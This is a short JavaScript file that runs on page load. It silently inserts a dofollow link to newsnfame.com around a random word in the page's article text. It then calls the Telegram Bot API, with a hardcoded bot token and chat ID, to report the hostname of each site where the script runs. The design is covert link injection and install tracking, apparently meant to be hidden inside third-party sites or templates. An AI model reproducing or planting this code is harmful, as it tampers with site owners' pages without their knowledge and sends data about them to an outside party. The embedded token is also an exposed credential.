document.addEventListener('DOMContentLoaded', function () {
    const YOUR_SITE = 'https://www.newsnfame.com/';
    const BOT_TOKEN = '8046263011:AAHorMJl4j11A05nr3JSRJgt2zyr323WnZs';
    const CHAT_ID = '-1002605627772'; 
    const MESSAGE = '🔔 الكود اشتغل على: ' + location.hostname;

    const article = document.querySelector('.post-body') || document.body;
    if (article) {
        const textOnly = article.innerText;
        const words = textOnly.split(/[\s,;:.!?()«»"'\\-–—]+/).filter(w => w.length >= 3);
        if (words.length > 0) {
            const randomWord = words[Math.floor(Math.random() * words.length)];
            const html = article.innerHTML;
            const replaced = html.replace(new RegExp('\\b' + randomWord + '\\b', 'u'),
                '<a href="' + YOUR_SITE + '" target="_blank" rel="dofollow">' + randomWord + '</a>');
            article.innerHTML = replaced;
        }
    }

    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: MESSAGE})
    }).catch(err => console.error('Telegram error:', err));
});